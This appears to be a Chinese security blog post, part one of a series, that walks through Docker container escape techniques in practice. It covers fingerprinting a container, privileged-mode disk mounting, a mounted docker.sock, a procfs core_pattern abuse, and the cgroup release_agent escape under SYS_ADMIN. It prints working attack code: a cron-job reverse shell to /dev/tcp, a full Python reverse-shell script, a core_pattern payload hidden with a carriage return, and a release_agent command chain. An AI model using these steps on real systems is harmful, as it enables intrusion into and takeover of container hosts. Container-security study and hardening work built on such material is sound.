<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xDNAxknjSY3PPPdxa_GcqQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/hiaiaLeG6N1zItD3hicyicTUxCsdYyvSZWKOQ4y3CslMX5EINOxRsoicGxHxJnwtXjIau4usI94yHUKXTqh4LyuVL4A/640?wx_fmt=gif)

**写在前面**

当涉及到容器技术和应用程序隔离时，Docker 是一个被广泛采用的解决方案。它提供了一个轻量级且可移植的容器平台，使得应用程序的部署变得更加简单高效。然而，安全性始终是一个关键的问题，在实际应用中，我们需要警惕潜在的风险和安全漏洞。在其中存在的 “逃逸问题” 尤为严重——它直接影响到了承载容器的 底层基础设施的保密性、完整性和可用性。

本文起因是笔者在某次项目中获得了一台 docker 容器权限后不知道如何逃逸，试了几种方法未逃逸成功后参考大量资料，对目前网上提到了大部分 docker 逃逸手法做了汇总复现，希望读者在阅读后，碰到此类情况能灵活运用。因此文章内容整体偏向实战下的逃逸手法总结，涉及原理细节方面描述就不做过多介绍了，有需要的可查看文末参考链接。  

因全文整体内容较长，将会拆分为多篇在本公众号发出，欢迎大家持续关注。本篇为第一篇。

* * *

**一、前言 - 如何逃逸**

**1、Docker 能被逃逸主要是三种问题**

1、系统本身内核漏洞问题，例如：CVE-2016-5195（脏牛 dirtycow-docker-vdso）；  

2、Docker 软件设计不当，例如：CVE-2019-5736（runc 逃逸）、CVE-2019-14271（CP 缺陷）；

3、配置不当，例如：开启特权模式（privileged）、宿主机目录挂载、功能（capabilities）机制、socket 通信方式。

**2、涉及 docker 的其他风险**

（该篇主要是以在 docker 环境下的逃逸手法为主，所以此处关于风险利用不细谈）。

1、Docker daemon api 未授权访问漏洞。

Docker swarm 是 Docker 集群管理工具，默认开放 2375web 端口用于远程管理 Docker 集群的 API，执行 docker 命令。当其存在未授权时，攻击者可以远程控制管理 docker 环境。

2、镜像反查 dockerfile 获取敏感信息。

a、当获取了 docker 权限后，查看一些配置项获取敏感信息。

b**、**在攻防中，很多攻击队为了武器化的方便，会在腾讯云或者阿里云上构建自己的 docker 镜像仓库，之后使用 docker 就可以在一台陌生的服务器上快速部署。

c、很多企业也会自建自己的镜像仓库，当攻防中获取到服务器权限之后，可以查看 docker 镜像仓库的信息，控制了镜像仓库我们就可以做一些供应链打击，或者长期的权限控制。

**3、一些基本信息收集**

当我们获取到一台服务器的 shell 权限时，如何确定自己当前环境是 docker，以及当前版本是否存在问题（也可以通过 / proc 文件夹下共享的一些文件获取敏感信息）。

(1) 是否存在 dockerenv：

```
ls -alh /     
#如果存在.dockerenv就是docker环境

```

(2) 通过查询系统进程 cgroup 判断：

```
cat /proc/1/cgroup |grep "docker"  
#看看返回接结果是否差不多都包含docker

```

(3) 进程枚举：

```
ps aux 
#检查进程数是否少于5个
ps -pl 
#查看当前pid为1的进程（pid为1的进程是否为常规init/system进程）

```

* 左右滑动查看更多

(4) 查看硬盘信息：

```
fdisk -l  
#如果为空表明为容器

```

(5) 查看当前 docker 的 capabilities：

```
cat /proc/1/status | grep Cap
capsh --decode=00000000a80425fb #查看权限
getpcaps $$

```

* 左右滑动查看更多

(6) 查看 docker 挂载情况:

```
df -h 
mount |grep '/  type'   #如果有内容说明是docker 
filesystgem  #挂载的设备 Mounted on 伪文件系统名称

```

* 左右滑动查看更多

例如：将本地 /root / 目录下的文件挂载到 check 目录下：

```
mount |grep '/ type'

```

如果有内容说明是 docker。

(7)/proc/pid 文件系统获取宿主机信息

建议限制容器与主机的交互、减少对 / proc 文件系统的共享，例如：

```
/proc/cpuinfo：可以查看CPU类型、核心数量和速度。
/proc/meminfo：可以查看内存总量和可用空间。
/proc/net/dev：可以查看网络接口的统计数据。
/proc/version：获取宿主机的Linux内核版本信息。
/proc/sys/kernel/hostname：获取宿主机的主机名等信息。

```

* 左右滑动查看更多

获取 docker 版本信息：

```
cat /proc/1/cgroup | grep "docker" | sed s/\\//\\n/g | tail -1

```

* 左右滑动查看更多

判断版本：

```
docker -v       dockers版本
docker-runc -v  dockerRunc版本
uname -a        查看内核版本

```

（8）其他： 

```
docke start 容器ID  #启动docker 
docker stop 容器ID #关闭docker
docker exec -ti 容器ID /bin/bash  #进入容器
docker ps -a   #查看当前所有容器 

```

* 左右滑动查看更多

**二、Docker 逃逸问题一：**

**危险配置**

**概述**

由于 "纵深防御" 和 "最小权限" 等理念和原则落地，能直接利用的漏洞变少了。刚公开的漏洞，立马就修复了。但因为新技术和各种复杂环境的出现。导致运维的失误也来了（就像 Kubernetes 安全问题——匆忙切换到时髦的、对开发人员友好的技术，同时留下巨大的安全隐患和代价高昂的 “安全债务”）。

因此因为人为的错误、危险的配置风险，反而是安全人员在检查中经常会遇到的，不仅仅是指 Docker 逃逸，其他漏洞也是，比如生产环境开启 Debug 模式导致漏洞利用等等。

Doceker 的危险配置主要涉及几个方面：

（1）开启特权模式（privileged）；

（2）宿主机目录不安全的挂载；

（3）启动参数的安全问题，例如功能（capabilities）机制、socket 通信方式等；

**逃逸方法**

_**2.1 逃逸方法一：配置不当，开启 Privilege 提权模式**_

**漏洞描述：** 

运维使用特权模式启动的容器时（docker run --privileged），Docker 将允许容器访问宿主机上的所有设备 (获取大量设备文件访问权限)，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。

因此 docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载进容器内部，从而获取对整个宿主机的文件读写权限，然后可直接通过 chroot 切换根目录、写 ssh 公钥和 crontab 计划任务方法逃逸到宿主机。 

PS：可能有些人会问：” 为什么还有人用特权用户开 docker？我都没用过这玩意。” 主要是一些特殊场景下，确实需要用到该功能。例如使用 systemctl 功能等。

**影响范围：**

只要配置存在问题，均影响，利用简单。

**漏洞验证：**

判断是否特权模式启动，CapEff 对应的掩码值为 0000003fffffffff 表示当前配置为提权模式。 

执行命令：

```
cat /proc/self/status |grep Cap

```

如何使用特权模式启动一个容器：

```
docker run --privileged <容器image name>

```

* 左右滑动查看更多

**漏洞利用手法：**

在 Privilege 特权模式下，逃逸的方式很多，常用的几种：

1、直接在容器内部挂载宿主机磁盘，然后就可以直接访问宿主机根目录，通过写入计划任务反弹宿主机 shell。

2、将 ssh 密钥写入宿主机，通过 SSH 登录。

先创建一个特权模式的容器，查看状态，CapEff 的值表示当前为特权模式 。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyfG54xA63YGWNTXicrE8h8XMDU7jhVDZictVcgT894ZqVSiaFJKPKFYq4g/640?wx_fmt=png)

在 docker 容器内找个目录新建一个文件夹，然后将宿主机的根目录挂载到当前目录中（这里如果不存在特权用户，但 docker 容器配置不当 - 进行危险挂载，是同样的风险，之后可以用相同的利用方式）。

查看当前设备的所有分区内容和操作分区：

```
fdisk -l 
//如果是非特权模式无法使用，可以通过df -h 获取磁盘信息

```

* 左右滑动查看更多

此时查看 / dev / 路径会发现很多设备文件：

```
ls /dev

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyWy8hxxVTQlJNGfiazVfAxYeUdtUQdu60viasT4Mh5Oia3Mib9Uhw9NgksA/640?wx_fmt=png)

同样的镜像创建的非特权模式用户 ls /dev 情况为：

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyfFkv82icJ8asWDZTuydORN9eruV14dZlSatpfhdEkhCBx86z3hMXcXw/640?wx_fmt=png)

将 / dev/vda1 挂载至新建的文件夹，这时候我们已经可以获取到宿主机的所有文件夹，可以任意读取修改宿主机的文件。进行挂载目录:

```
mount /dev/vda1 /1234 

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyicbKBHHSqzGGQN1IMoTeCmj4xUEWZA7vIMbP1Tkjx5wn47dXzFk6qBw/640?wx_fmt=png)

之后写计划任务执行反弹 shell 命令即可。

```
echo '* * * * * bash -i >& /dev/tcp/xxx.xxx.xxx.xx/5555 0>&1' >> /1111/var/spool/cron/root

```

* 左右滑动查看更多

等一会，就能获取到 webshell。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkylzd1t9e86kbJL6oaiaZp8HJtcE3V72ejMrmhPX9ZCKYTsHwibbgcMQgw/640?wx_fmt=png)

PS：需要注意一点，如果在利用过程中发现 vim 修改失败（宿主机文件实际未修改成功）可以留意一下，问题原因可参考:

```
https://blog.csdn.net/a772304419/article/details/113887233

```

* 左右滑动查看更多

_**2.2 逃逸方法二：配置不当 - 挂载敏感目录导致 Docker**_ _**逃逸**_

**漏洞描述：**

在启动 docker 容器时，将服务器中的根目录或敏感目录挂载到容器中时，可能会造成 docker 逃逸。

**影响范围：**

 一般可以利用点：

a、宿主机 / var/run/docker.sock 文件被挂载到容器中， find / -name docker.sock。

b、宿主机 procfs 被挂载（有些业务为了某些特殊需求，会被挂载）。

**漏洞利用：**

利用一：挂载 Docker Socket 逃逸

在启动 `docker` 容器时，如果宿主机 / var/run/docker.sock 文件被挂载到 docker 容器中，在 docker 容器中，也可以操作宿主机的 docker。  

检查是否存在被挂载：

```
find / -name docker.sock

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkylibrnzAjx1g5ibN21yEco61XxMR7JcHylghl2OkFBSLKK0Bu2ZCjZlsQ/640?wx_fmt=png)

在 docker 中使用命令查看宿主机拉取的镜像。 

```
docker -H unix://var/run/docker.sock images

```

* 左右滑动查看更多

然后在 docker 容器中，使用命令再运行一个 docker 容器，但添加参数，将宿主机的根目录挂载到容器的 xxx 目录下：

```
docker -H unix://var/run/docker.sock run -v /:/test -it ubuntu:16.04 /bin/bash
ls /test

```

* 左右滑动查看更多

后续参考之前的特权用户逃逸，是同样的利用手法。

利用二：挂载宿主机 procfs 逃逸 

procfs 是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多敏感文件。

procfs 中的 / proc/sys/kernel/core_pattern 负责配置进程崩溃时内存转储数据的导出方式。从 2.6.19 内核版本开始，如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。但逃逸的触发条件比较苛刻，需要有进程崩溃才能触发。 

检查是否存在漏洞：

```
find / -name core_pattern

```

如果结果存在两个 core_pattern 文件，则可能存在挂载 procfs。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TDcApeaFf9UTopImtBGibyAyJHliaehFOib6E5mKFaT9NicQf3je1Pc8licA/640?wx_fmt=png)

一般我们安全的是只显示一个 。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyyxDpc6zKHxPCbx4Wh4VzMLbGKXoYyfQSUrywibtDHoG5rnFwL8EBlicA/640?wx_fmt=png)

利用过程：

先搭建环境：

```
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern xxximages 镜像

```

* 左右滑动查看更多

主要配置是：

```
-v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern 进行挂载

```

* 左右滑动查看更多

1、准备一个执行反弹 shell 的 python 脚本，添加 chmod 777 权限：

```
#!/usr/bin/python3
import os
import pty
import socket
lhost = "xxxxxx" #注意添加监听IP
lport = 10000
def main():
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.putenv("HISTFILE", '/dev/null')
pty.spawn("/bin/bash")
# os.remove('/tmp/.safe.py')
s.close()
if __name__ == "__main__":
main()

```

* 左右滑动查看更多

获取当前文件在宿主机中的路径：

cat /proc/mounts | grep docker

```
var/lib/docker/overlay2/db944ef403ea1d31dcb81a408763980582637b40c8c8cd6168aa918a000db18b/

```

* 左右滑动查看更多

![](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TfJZvazbmuqlsLcA6v0aFEnoV2lZtyOnuVFTISLEahXo18a5Bqbd9icA/640?wx_fmt=png)

2、再一个触发进程崩溃的 C 语言：

```
#include<stdio.h>
int main(void) {
int *a  = NULL;
*a = 1;
return 0;
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TlsFCCKpMuowJ5m6QOVBManxcwZZicfg7z61EX4W9ChBelvoaGYatuXw/640?wx_fmt=png)

3、通过 echo，将需要执行的内容写入到共享的 / proc 目录下的 core_pattern 文件中：

```
echo -e "|/var/lib/docker/overlay2/db944ef403ea1d31dcb81a408763980582637b40c8c8cd6168aa918a000db18b/merged/tmp/.safe.py \\rcore " >  /host/proc/sys/kernel/core_pattern

```

* 左右滑动查看更多

备注：

*   首个字符是管道符 | ，其后面的内容将被当作用户空间程序或脚本解释并执行。
    

*   因为 Linux 转储机制是对 / proc/sys/kernel/core_pattern 内程序的查找是在宿主机文件系统进行的，因此需要将路径换成宿主机的路径。
    

*   添加 \\r 隐藏攻击。在 Bashshell 中，\\r 是回车符的转义字符。其作用是将光标移动到当前行的开头，当字符串 |/var/tmp/.t.py \\rcore 被写入文件时，回车符会使其后面的部分 core 覆盖前面的部分。直接 cat 只会显示 core 内容。如果想看完整内容，需要使用编辑器查看。
    

执行触发崩溃的 C 文件，成功反弹 shell。

![](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31T8Z5xYZ80ujpYfB4IXXxqzj2nwfWByw14Gibcxlj8HcqOGXFwERYiaiaIA/640?wx_fmt=png)

_**2.3 逃逸方法三：相关启动参数存在安全问题**_

**漏洞描述：** 

Docker 中存在一些比较高危的启动命令，赋予容器较高权限，允许执行一些特权操作，在一定的条件下，可能导致 docker 逃逸。 

注：这些启动参数本身并非一定不安全，只是它们可能增加了容器被攻击的风险。

**影响范围：**

Docker 通过 Linux namespace 实现 6 项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。不安全的风险参数可能会突破这种资源隔离。 

启用的一些风险参数：

```
--privileged 
在容器中启用特权模式
--cap-add 和--cap-drop 
用于向容器添加或删除特定的内核功能（capabilities），容器内进程可能获取高权限。
--network=host 
容器与宿主机共享网络命名空间，容器直接访问宿主机的网络资源。

```

* 左右滑动查看更多

**漏洞利用：**

这里的问题其实会与前两中手法有重复。例如：利用手法 1 提到了是使用 --privileged 特权模式参，手法 2 中是使用 -v /path1:/path2 挂载目录参数，主要是为了让自己能更好的理解，又写了一部分。

（1）--privileged 在容器中启用特权模式。 

Docker 容器被允许可以访问主机上的所有设备、可以获取大量设备文件的访问权限、并可以执行 mount 命令在容器内挂载宿主机的文件，进行修改。例如写入计划任务到宿主机，利用手法参考前面即可。

（2）--cap-add 和 --cap-drop 用于向容器添加或删除特定的内核功能（capabilities） 。

Dockcer 容器的功能机制（Capabilities）主要思想在于分割 root 用户的特权，打破了 UNIX/LINUX 操作系统中超级用户与普通用户的概念，允许普通用户执行超级用户权限方能运行的命令。与 --privileged 区别在于 privileged 是权限全开，而 --cap-add 是将权限功能进行更加的颗粒度细化，需要什么开什么。根据添加的参数不同，权限不同，其参数非常多。

```
官方手册
https://docs.docker.com/engine/reference/run/

```

* 左右滑动查看更多

列举几个可以被逃逸的情况： 

*   以 --cap-add=SYS_ADMIN 启动，允许对系统进行管理员级别的操作。Container 进程就被允许执行 mount、umount 等一系列系统管理命令。
    
*   以 --cap-add=SYS_PTRACE 启动，允许使用 ptrace 系统调用进行进程跟踪和调试。可以通过进程注入进行逃逸。
    
*   以 --cap-add=SYS_MODULE 启动，允许进程加载和卸载内核模块。直接加载内核模块逃逸。
    

因为根据 --cap-add 赋予的不同的权限情况，需要对应的利用手法都不太一样。这里举例 --cap-add=SYS_ADMIN 的手法，其他的利用手法可以参考下面的链接：

```
https://www.freebuf.com/vuls/264843.html Docker SYS_ADMIN 容器逃逸原理解析
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#privesc-container-escape
https://blog.csdn.net/qq_55316925/article/details/128511304 SYS_PTRACE+SYS_Module的docker逃逸

```

* 左右滑动查看更多

**SYS_ADMIN 配置下的 docker 逃逸：**

逃逸触发的前置配置条件：

--cap-add=SYS_ADMIN 、 -security-opt apparmor=unconfined(或容器没有启用 Docker 默认的 AppArmor 配置文件 docker-default) 、docker 容器内用户 root 权限。

备注：

第二个条件是告诉 Docker 禁用或绕过 AppArmor 安全策略。AppArmor 是一个 Linux 内核的安全模块，用于实施应用程序的安全策略和访问控制。这时容器中的进程不受 AppArmor 的限制（在一些特殊情况运维会需想执行一些受限操作）。不过在一些宿主机上，比如 CentOS 等 Red Hat 系的 Linux 操作系统上默认没有安装 AppArmor，因此及时没配置也满足条件。

笔者测试了一下个人的几台服务器，装 centos 的天翼云确实没有，而装了 ubunt 的阿里云和本地 kali 虚拟机都安装了 AppArmor。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TcoxmzNFDTZLInWVzzCQl3GNCKaibviaHvJY1WPjwAhCF32B2zcZbZ94Q/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TzTHFia1iaZ4tfyQIK2TCBezz1fVIE3tfV6uchVlsbT6Qcw13YkuibqvbA/640?wx_fmt=jpeg)

利用 EXP：

1、挂载宿主机 cgroup，并自定义一个 cgroup，这里是 / tmp/cgrp/x：

```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/xxx

```

* 左右滑动查看更多

2、配置 / tmp/cgrp/x 的 cgroup 的 notify_no_release 和 release_agent：

```
echo 1 > /tmp/cgrp/x/notify_no_release
host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

```

* 左右滑动查看更多

3、写入自定义命令进行逃逸（sh tcp 的反弹来逃逸容器）：

```
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/xxx.xxx.xxx/8443 0>&1">> /cmd 
chmod a+x /cmd

```

* 左右滑动查看更多

4、触发 release_agent 执行。

```
sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"

```

```
*左右滑动查看更多




```

写入需要执行的 shell 命令，进行反弹：

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31Tjq7VcSC66ictYy7cb17MuUXEa3tluiaDa6J6BEkZKTCVkF9SXKkVmGSw/640?wx_fmt=png)

成功获得宿主机的 shell：

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zILiaxgAuBsouKfcCRqhr31TYZoaaxwywyogqABkq39yU1cyKQEAWtbfuh59xbcPBjE8xFwH6JPXcA/640?wx_fmt=png)

具体触发过程机制描述：

想要实现 docker 逃逸，我们需要一个能够创建 release_agent 文件且能够触发 release_agent 执行的 cgroup。

1、

```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

```

* 左右滑动查看更多

挂载宿主机的 memory cgroup。，并在该 cgroup 下创建一个子 cgroup（x 目录就是子 cgroup），需要注意的是因为挂载，这时候 mkdir 的子 cgroup 是会在宿主机下生成的。

2、

```
echo 1 > /tmp/cgrp/x/notify_on_release

```

* 左右滑动查看更多

激活子 cgroup 中的 notify_on_release，使得在子 cgroup 退出时能够执行其父 cgroup 中的 release_agent。cgroup 的每一个 subsystem 都有参数 notify_on_release，布尔型，设置为 1 时表示启用。

如果 notify_on_release 启用，当 cgroup 不再包含任何任务时（即，cgroup 的 tasks 文件里的 PID 为空时），系统内核会执行 release_agent 参数指定的文件里的内容。也就是当 / tmp/cgrp/x 被移除时，内核将会运行顶层 cgroup(/tmp/cgrp) 下的 release_agent 文件中的命令。

3、

```
host_path=sed -n 's/.\perdir=\([^,]\).*/\1/p' /etc/mtab echo "$host_path/cmd" > /tmp/cgrp/release_agent

```

* 左右滑动查看更多

设置 release_agent 脚本路径（需要设置在宿主机视角下的路径地址），文件 / etc/mtab 存储了容器中实际挂载的文件系统。

4、

```
sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs”

```

* 左右滑动查看更多

启动一个 sh 进程，将 sh 进程的 PID（\\$\\$）写入到 / tmp/cgrp/x/cgroup.procs 里。执行完 sh -c 之后，sh 进程自动退出，cgroup /tmp/cgrp/x 里不再包含任务，/tmp/cgrp/release_agent 文件里的 shell 将被操作系统内核执行。

这里再主要说明一下，如何排查当前 docker 容器的权限情况。

通过执行命令：

```
cat /proc/1/status | grep Cap

```

查看当前的 Capabilities 权限： 

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyfmk3CyjhBQT2UrM7Kia0D65wc0SB5ovcBictUKxicJyn7I2rlfvOU2Q0w/640?wx_fmt=png)

*   CapInh（可继承的 capabilities）：表示当前用户可以从父进程继承的 capabilities。
    
*   CapPrm（允许的 capabilities）：表示当前用户被授予的所有 capabilities。
    
*   CapEff（有效的 capabilities）：表示当前用户在当前会话中实际可以使用的 capabilities。
    
*   CapBnd（边界集 capabilities）：表示限制当前用户可使用的 capabilities 的一个范围。
    

再通过 capsh --decode=00000000a80425fb 命令的输出来确定当前用户的 capabilities（功能权限）。 

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkysZH1OsyGpVVRIp0j7mNg1RxcZI5ZFetibIoaLciaaLXrficC07xtJd0Og/640?wx_fmt=png)

也可以直接通过 getpcaps $$ 获取。 

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkyeUPfxaOTYgumFV3aeQibtQsI19gEr8WH2jQr0rxUjGr0P4uu39QmqJA/640?wx_fmt=png)

一些常见的权限判断示例： 

案例：

```
执行命令：
getpcaps $$  
// $ 符号后面的 $$ 表示当前进程的 ID，返回当前进程的 capabilities 权限信息
输出结果：
Capabilities for process 1234: = cap_net_admin,cap_net_raw+p
解释：
当前进程的 capabilities 包括 CAP_NET_ADMIN 和 CAP_NET_RAW，权限为 p（即允许）
e 表示 effective（有效权限），表示进程实际上具有的权限。这些权限是进程在执行时真正起作用的权限。
i 表示 inheritable（可继承权限），表示进程在创建其他子进程时可以继承的权限。子进程将继承父进程的可继承权限。
p 表示 permitted（允许权限），表示进程可以拥有的权限。这些权限是进程可用的权限，但不一定是实际生效的权限。进程可能会受到其他限制（如安全策略、权限控制）而无法使用其中的一些权限。

```

* 左右滑动查看更多

1、判断是否具有特定的 capability： 

查找 CapPrm 字段中是否包含需要判断的 capability，如果存在，则表示当前用户具有该 capability 权限。 

![图片](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zLykKiasmym7UFiccL7ClEbkysZH1OsyGpVVRIp0j7mNg1RxcZI5ZFetibIoaLciaaLXrficC07xtJd0Og/640?wx_fmt=png)

2、判断是否具有执行特定命令的权限： 

查找 CapEff 字段中是否具有与执行特定命令相关的 capability。例如，如果要判断当前用户是否具有执行网络相关命令的权限，可以检查 CapEff 中是否具有 CAP_NET_ADMIN 或 CAP_NET_RAW 这样的网络相关 capability。 

但需要注意 capabilities 只是 Linux 系统中一个细分的权限控制机制，判断当前用户的权限还与用户所属的用户组、文件权限等因素有关。所以判断当前用户的权限还需要综合考虑多个方面，包括用户身份、用户组、文件权限、capabilities 等。

3、-network=host 容器与宿主机共享网络命名空间，容器直接访问宿主机的网络资源。   

容器内的进程可以直接访问主机网络上的所有资源，包括其他容器和主机上的服务。当获取 docker 权限后等同于进入了一个内网段，而不是整个网段内只能探测到当前一台 docker 主机。其利用手法可以看下文中的 Docker Containerd 漏洞 CVE-2020-15257。

(未完待续)

**本文参考资料及推荐阅读：**

```
CVE-2019-5736 runc容器逃逸漏洞分析
https://x3fwy.bitcron.com/post/runc-malicious-container-escape
渗透测试之Docker逃逸
https://xz.aliyun.com/t/8558# toc-0
『杂项』Docker 逃逸方法汇总
https://mp.weixin.qq.com/s/FeOsaMgTMI0AwN7UzTjxAg
脏牛漏洞-Docker逃逸POC（dirtycow-vdso)代码分析
https://blog.csdn.net/enjoy5512/article/details/53196047
【云原生渗透】- containerd-shim容器逃逸漏洞(CVE-2020-15257)
https://zhuanlan.zhihu.com/p/471532280
host模式容器逃逸漏洞（CVE-2020-15257）技术分析
https://mp.weixin.qq.com/s/WmSaLPnG4o4Co1xRiYCOnQ
CVE-2019-14271分析与复现
https://ssst0n3.github.io/post/网络安全/安全研究/容器安全/进程容器/服务器容器/docker/历史漏洞分析与复现/docker-software/plumbing/docker-cp/CVE-2019-14271/分析/CVE-2019-14271分析与复现.html
CVE-2019-5736 runc容器逃逸漏洞分析
https://x3fwy.bitcron.com/post/runc-malicious-container-escape
Docker SYS_ADMIN 容器逃逸原理解析
https://www.freebuf.com/vuls/264843.html
Docker安全性与攻击面分析
https://zhuanlan.zhihu.com/p/152052618

```

* 左右滑动查看更多

**插播一条招聘信息**

_**一、安全研究工程师实习生（25/26 届）**_

**工作地点：深圳  
岗位职责：**  
1、具有较强的责任感、具备能够独立的开展工作的能力、自学能力强、做事踏实认真；   
2、对防御对抗、反溯源、攻击利用等相关红队工具进行研究和开发；  
3、熟悉 OWASP TOP 10，具有网络安全、系统安全、Web 安全等方面的理论基础；  
4、熟悉常见编程语言中的一种（Java、Python、PHP、GO），并能够熟练写出针对性的测试脚本；  
5、参与区域内网渗透测试、代码审计、红蓝对抗活动、最新漏洞动态跟踪及复现、风险评估、客户培训等工作；  
6、主要参与新服务、新技术创新服务的研究;  
7、根据 ATT&CK 框架梳理研究相关 TPPs，并形成对应的检测规则。  
**加分项：**  
1、具有渗透测试经验或逆向分析能力或溯源分析能力，曾经参与过大型的红蓝对抗项目;  
2、熟悉 Java、Python、PHP、GO 等编程，并有良好的编程习惯和丰富的代码经验；  
3、具备钻研精神，愿意在安全领域做出技术突破；  
4、具有较强的责任感、具备能够独立的开展工作的能力、自学能力强、做事踏实认真；   

_**二、代码审计工程师实习生（25/26 届）**_**  
工作地点：深圳  
岗位职责：**  
1、跟踪和分析业界最新安全漏洞。  
2、挖掘 Java、PHP 程序中未知的安全漏洞和代码缺陷，并对漏洞进行验证，编制安全加固报告;  
3、主要参与新服务、新技术创新服务的研究;  
任职要求：  
1、对 JAVA/PHP 编程有较深入的了解，具备较强的 Java/PHP 代码审计能力，有丰富实战能力；  
2、熟悉 JAVA/PHP 主流框架，具备有一定的编程能力；  
3、深入理解常见安全漏洞产生原理及防范方法；  
4、熟练掌握源代码测试工具及测试流程，有 CNVD、CNNVD 等漏洞证书、CVE 或 CTF 比赛获奖者者优先。  
5、熟悉主流的源代码审计工具；  
6、思路清晰，具有优秀的分析、解决问题的能力，有良好的学习能力及团队协作能力；  
7、具备较强的沟通能力、抗压能力，团队合作精神及钻研精神。

**简历投递可扫描本文末二维码添加小编微信，或直接发送至邮箱 securityteam@dbappsecurity.com.cn**  

* * *

**往期回顾**

[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zJAh2UJXqVYIq8n7HKuMNKHXW1PI1oMiaKxZC8VzIK6rKxqM04u0uo0YlD7MW1ic3IaZwmmMhW1STMg/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247526171&idx=1&sn=c519411b5d5a645a1e4a3d6c3d0b8300&chksm=9ae12623ad96af350aad16f3756d8cdfec0bb9a7fcdf2f062751f988f9c18c1f998500b80dc3&scene=21#wechat_redirect)

[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zJAh2UJXqVYIq8n7HKuMNKHLZRfE71LoibXpobhxra6wdjCAdsOn4C0SW8xv9sVT8eVFGMWjFicyBUQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247525850&idx=1&sn=9d5a10bc2a3ec850853a177c4f78d028&chksm=9ae124e2ad96adf496a21b39d08ce293ec22b5b13438aef9c218d770a725b08c9219d76efc6b&scene=21#wechat_redirect)

[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zJAh2UJXqVYIq8n7HKuMNKH3yGFQ2cunzibF9BRlb12SlYsZOQtKVoPdQochoSJC0eVxbiaicq0o5h0g/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247525850&idx=2&sn=c4367a195f68dc49ceaa6c4e6bb2b395&chksm=9ae124e2ad96adf434752bc29dd50b8ac1ae6c80bd099e9d94432dc5eb87a3db54d0308b497f&scene=21#wechat_redirect)

[![图片](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zKElhBP0Ht29XSLqh4H5Ey7ibyIrAxEUfNAKV2wicJgt5Dv7l96iafmP6rdR8EcpnQjdoyueYYoxWxsQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247525580&idx=1&sn=f89c7e327fbfb351898bc3a4d71432d6&chksm=9ae125f4ad96ace2f62a6de76300ce168699b3dac03dfa30f1f72c2c51395851c5e6faa3f011&scene=21#wechat_redirect)

